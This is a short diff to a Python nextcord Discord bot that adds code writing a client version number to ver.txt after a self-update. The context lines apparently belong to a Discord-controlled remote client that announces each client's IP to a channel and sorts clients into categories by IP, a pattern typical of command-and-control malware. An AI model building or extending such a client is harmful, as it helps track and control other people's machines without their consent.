@@ -123,6 +123,10 @@ async def on_ready():
                 await channel5.send(f"Client updated to version v{tex}")
                 with open(os.path.join(target_path, "skibidi-mainmain", "update.txt"), "w") as up:
                     up.write("")
+                    up.close()
+                with open(os.path.join(target_path, "skibidi-mainmain", "ver.txt"), "w") as up2:
+                    up2.write(tex)
+                    up2.close()
             await channel12.send(f"Client {ip} online!")
             category = nextcord.utils.get(guild.categories, name=str(ip))
             if category:
